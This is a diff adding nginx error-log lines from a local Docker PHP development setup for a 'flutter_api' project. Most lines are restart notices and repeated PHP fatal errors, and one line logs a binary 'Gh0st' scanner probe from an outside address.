@@ -396,3 +396,837 @@ Stack trace:
 2021/06/05 16:01:01 [info] 25#25: *5 client 172.18.0.1 closed keepalive connection
 2021/06/06 01:43:19 [info] 25#25: *7 client 172.18.0.1 closed keepalive connection
 2021/06/06 01:47:42 [info] 25#25: *9 client 172.18.0.1 closed keepalive connection
+2021/06/11 03:55:52 [notice] 1#1: using the "epoll" event method
+2021/06/11 03:55:52 [notice] 1#1: nginx/1.20.0
+2021/06/11 03:55:52 [notice] 1#1: built by gcc 10.2.1 20201203 (Alpine 10.2.1_pre1) 
+2021/06/11 03:55:52 [notice] 1#1: OS: Linux 5.8.0-55-generic
+2021/06/11 03:55:52 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/06/11 03:55:52 [notice] 1#1: start worker processes
+2021/06/11 03:55:52 [notice] 1#1: start worker process 33
+2021/06/11 03:56:06 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/06/11 03:56:06 [notice] 33#33: gracefully shutting down
+2021/06/11 03:56:06 [notice] 33#33: exiting
+2021/06/11 03:56:06 [notice] 33#33: exit
+2021/06/11 03:56:06 [notice] 1#1: signal 17 (SIGCHLD) received from 33
+2021/06/11 03:56:06 [notice] 1#1: worker process 33 exited with code 0
+2021/06/11 03:56:06 [notice] 1#1: exit
+2021/06/11 03:56:15 [notice] 1#1: using the "epoll" event method
+2021/06/11 03:56:15 [notice] 1#1: nginx/1.20.0
+2021/06/11 03:56:15 [notice] 1#1: built by gcc 10.2.1 20201203 (Alpine 10.2.1_pre1) 
+2021/06/11 03:56:15 [notice] 1#1: OS: Linux 5.8.0-55-generic
+2021/06/11 03:56:15 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/06/11 03:56:15 [notice] 1#1: start worker processes
+2021/06/11 03:56:15 [notice] 1#1: start worker process 33
+2021/06/11 03:56:20 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/06/11 03:56:20 [notice] 33#33: gracefully shutting down
+2021/06/11 03:56:20 [notice] 33#33: exiting
+2021/06/11 03:56:20 [notice] 33#33: exit
+2021/06/11 03:56:20 [notice] 1#1: signal 17 (SIGCHLD) received from 33
+2021/06/11 03:56:20 [notice] 1#1: worker process 33 exited with code 0
+2021/06/11 03:56:20 [notice] 1#1: exit
+2021/06/11 04:07:22 [notice] 1#1: using the "epoll" event method
+2021/06/11 04:07:22 [notice] 1#1: nginx/1.20.0
+2021/06/11 04:07:22 [notice] 1#1: built by gcc 10.2.1 20201203 (Alpine 10.2.1_pre1) 
+2021/06/11 04:07:22 [notice] 1#1: OS: Linux 5.8.0-55-generic
+2021/06/11 04:07:22 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/06/11 04:07:22 [notice] 1#1: start worker processes
+2021/06/11 04:07:22 [notice] 1#1: start worker process 32
+2021/06/11 04:07:27 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2021/06/11 04:07:27 [notice] 32#32: gracefully shutting down
+2021/06/11 04:07:27 [notice] 32#32: exiting
+2021/06/11 04:07:27 [notice] 32#32: exit
+2021/06/11 04:07:27 [notice] 1#1: signal 17 (SIGCHLD) received from 32
+2021/06/11 04:07:27 [notice] 1#1: worker process 32 exited with code 0
+2021/06/11 04:07:27 [notice] 1#1: exit
+2021/06/11 04:09:05 [notice] 1#1: using the "epoll" event method
+2021/06/11 04:09:05 [notice] 1#1: nginx/1.20.0
+2021/06/11 04:09:05 [notice] 1#1: built by gcc 10.2.1 20201203 (Alpine 10.2.1_pre1) 
+2021/06/11 04:09:05 [notice] 1#1: OS: Linux 5.8.0-55-generic
+2021/06/11 04:09:05 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2021/06/11 04:09:05 [notice] 1#1: start worker processes
+2021/06/11 04:09:05 [notice] 1#1: start worker process 32
+2021/06/11 04:14:33 [info] 32#32: *1 client sent invalid method while reading client request line, client: 66.240.205.34, server: _, request: "Gh0st≠   ‡   xúKS``ò√¿¿¿ƒå@ºQñÅÅ	Hßïe&ß*$&g+2îˆ∞00¨®rc †Ç\`&É«K7ÜÂn9ïn;Ñ3¨Ësch®^œ4'Jó©Ç„0√ëh]&ê¯ŒóSÀA4L?2=·ƒíÜ@ı`TÆØ]"
+2021/06/11 04:16:17 [error] 32#32: *2 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:2
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 2" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET / HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 04:16:44 [error] 32#32: *2 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:2
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 2" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET / HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 04:17:17 [info] 32#32: *3 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 04:39:28 [error] 32#32: *6 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:2
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 2" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET / HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 04:40:28 [info] 32#32: *7 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 04:42:21 [error] 32#32: *9 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:12
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 12" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 04:42:35 [info] 32#32: *10 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 04:42:41 [error] 32#32: *9 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:12
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 12" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 04:43:02 [error] 32#32: *9 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:12
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 12" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 04:43:41 [info] 32#32: *18 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 04:43:45 [error] 32#32: *9 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:12
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 12" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 04:44:16 [error] 32#32: *9 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:12
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 12" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 04:44:45 [info] 32#32: *21 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 04:51:48 [error] 32#32: *24 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:12
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 12" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 04:51:51 [info] 32#32: *24 client 172.20.0.1 closed keepalive connection
+2021/06/11 04:54:27 [error] 32#32: *26 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:12
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 12" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 04:54:27 [error] 32#32: *27 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:12
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 12" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 04:54:30 [info] 32#32: *26 client 172.20.0.1 closed keepalive connection
+2021/06/11 04:54:30 [info] 32#32: *27 client 172.20.0.1 closed keepalive connection
+2021/06/11 04:55:32 [error] 32#32: *30 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:12
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 12" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 04:55:35 [info] 32#32: *30 client 172.20.0.1 closed keepalive connection
+2021/06/11 04:56:34 [error] 32#32: *32 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:12
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 12" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 04:56:37 [info] 32#32: *32 client 172.20.0.1 closed keepalive connection
+2021/06/11 04:57:01 [error] 32#32: *34 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:9
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 9" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 04:57:04 [info] 32#32: *34 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:00:35 [error] 32#32: *36 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:8
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 8" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:00:39 [info] 32#32: *36 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:01:41 [error] 32#32: *38 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:8
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 8" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:01:44 [info] 32#32: *38 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:02:13 [error] 32#32: *40 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:8
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 8" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:02:16 [info] 32#32: *40 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:02:42 [error] 32#32: *42 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function _REQUEST() in /docker/home/index.php:8
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 8" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:02:45 [info] 32#32: *42 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:03:31 [error] 32#32: *44 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Array callback must have exactly two elements in /docker/home/index.php:8
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 8" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:03:34 [info] 32#32: *44 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:04:34 [error] 32#32: *46 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Array callback must have exactly two elements in /docker/home/index.php:8
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 8" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:04:38 [info] 32#32: *46 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:05:05 [error] 32#32: *48 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Array callback must have exactly two elements in /docker/home/index.php:9
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 9" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:05:08 [info] 32#32: *48 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:05:51 [error] 32#32: *50 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Array callback must have exactly two elements in /docker/home/index.php:9
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 9" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:05:54 [info] 32#32: *50 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:07:07 [error] 32#32: *52 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Array callback must have exactly two elements in /docker/home/index.php:9
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 9" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:08:08 [info] 32#32: *54 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:08:10 [error] 32#32: *52 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Array callback must have exactly two elements in /docker/home/index.php:9
+Stack trace:
+#0 {main}
+  thrown in /docker/home/index.php on line 9" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:09:10 [info] 32#32: *61 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:10:29 [info] 32#32: *67 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:11:00 [info] 32#32: *72 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:11:53 [error] 32#32: *74 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:5
+Stack trace:
+#0 /docker/home/index.php(13): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 5" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:11:56 [info] 32#32: *74 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:12:58 [info] 32#32: *76 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:13:32 [error] 32#32: *78 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:4
+Stack trace:
+#0 /docker/home/index.php(12): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 4" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:13:36 [info] 32#32: *78 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:19:45 [info] 32#32: *80 client 45.79.175.250 closed keepalive connection
+2021/06/11 05:28:54 [error] 32#32: *82 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Using $this when not in object context in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:28:57 [info] 32#32: *82 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:29:15 [error] 32#32: *84 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Using $this when not in object context in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:29:34 [error] 32#32: *84 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:7
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 7" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:29:36 [error] 32#32: *84 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:7
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 7" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:30:15 [info] 32#32: *85 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:30:16 [error] 32#32: *89 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:5
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 5" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:30:19 [info] 32#32: *89 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:30:57 [error] 32#32: *91 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:14
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 14" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:31:00 [info] 32#32: *91 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:31:16 [error] 32#32: *93 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:6
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 6" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:31:19 [info] 32#32: *93 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:31:38 [error] 32#32: *95 FastCGI sent in stderr: "PHP message: PHP Warning:  include(./db.php): Failed to open stream: No such file or directory in /docker/home/flutter_api/list.php on line 3PHP message: PHP Warning:  include(): Failed opening './db.php' for inclusion (include_path='.:/usr/local/lib/php') in /docker/home/flutter_api/list.php on line 3PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:7
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 7" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:31:41 [info] 32#32: *95 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:32:27 [error] 32#32: *97 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:4
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 4" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:32:28 [error] 32#32: *100 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:4
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 4" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "172.20.0.1"
+2021/06/11 05:32:32 [info] 32#32: *100 client 172.20.0.1 closed keepalive connection
+2021/06/11 05:32:58 [error] 32#32: *97 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:4
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 4" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:33:05 [error] 32#32: *97 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:4
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 4" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:33:06 [error] 32#32: *97 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:4
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 4" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:33:27 [info] 32#32: *98 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:34:12 [error] 32#32: *97 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /db.php HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:34:51 [error] 32#32: *97 FastCGI sent in stderr: "PHP message: PHP Warning:  mysqli::connect(): (HY000/2002): No such file or directory in /docker/home/flutter_api/db.php on line 23PHP message: PHP Fatal error:  Uncaught RuntimeException: mysqli connection error: No such file or directory in /docker/home/flutter_api/db.php:29
+Stack trace:
+#0 {main}
+  thrown in /docker/home/flutter_api/db.php on line 29" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /flutter_api/db.php HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:35:12 [info] 32#32: *107 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:36:52 [info] 32#32: *113 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:37:36 [error] 32#32: *116 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Call to a member function execute() on bool in /docker/home/flutter_api/list.php:6
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 6" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:38:04 [error] 32#32: *116 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Using $this when not in object context in /docker/home/flutter_api/list.php:19
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 19" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:38:22 [info] 32#32: *117 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:42:14 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 17PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:17
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 17" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:42:32 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Undefined constant "hi" in /docker/home/flutter_api/list.php:37
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 37" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:42:44 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Uncaught Error: Undefined constant "hi" in /docker/home/flutter_api/list.php:37
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 37" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:43:02 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 15PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:15
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 15" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:43:13 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 15PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:15
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
+  thrown in /docker/home/flutter_api/list.php on line 15" while reading response header from upstream, client: 172.20.0.1, server: _, request: "GET /?route=user.list HTTP/1.1", upstream: "fastcgi://172.20.0.2:9000", host: "localhost"
+2021/06/11 05:43:14 [info] 32#32: *125 client timed out (110: Operation timed out) while waiting for request, client: 172.20.0.1, server: 0.0.0.0:80
+2021/06/11 05:43:21 [error] 32#32: *124 FastCGI sent in stderr: "PHP message: PHP Warning:  Undefined property: mysqli::$connection in /docker/home/flutter_api/list.php on line 15PHP message: PHP Fatal error:  Uncaught Error: Call to a member function stmt_init() on null in /docker/home/flutter_api/list.php:15
+Stack trace:
+#0 /docker/home/index.php(24): include()
+#1 {main}
